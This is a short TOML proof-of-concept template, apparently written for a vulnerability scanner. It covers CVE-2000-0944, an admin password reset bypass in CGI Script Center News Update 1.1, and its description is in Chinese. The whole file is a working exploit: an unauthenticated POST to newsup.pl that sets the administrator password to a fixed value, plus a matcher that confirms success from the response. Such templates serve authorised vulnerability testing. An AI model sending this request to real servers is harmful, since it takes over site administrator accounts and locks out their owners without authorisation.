[info]
author = "ave"
description = "检测 CGI Script Center News Update 1.1 管理员密码修改绕过漏洞。通过向 newsup.pl 发送未经验证的 POST 请求，无需原密码即可重置管理员密码。响应包含 'Password Success' 即表示漏洞存在。"
id = "POC-AVE-2000-0690"
name = "CVE-2000-0944 PoC"
severity = "critical"
tags = ["ave-2000-0690"]
vuln_id = [
    "CVE-2000-0944",
    "AVE-2000-0690",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/dummy/newsup/newsup.pl"
protocol = "http"

[poc.requests.body]
content = "pwd=morpheus&pwd2=morpheus&setpwd=++Set+Password++"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Password Success"]
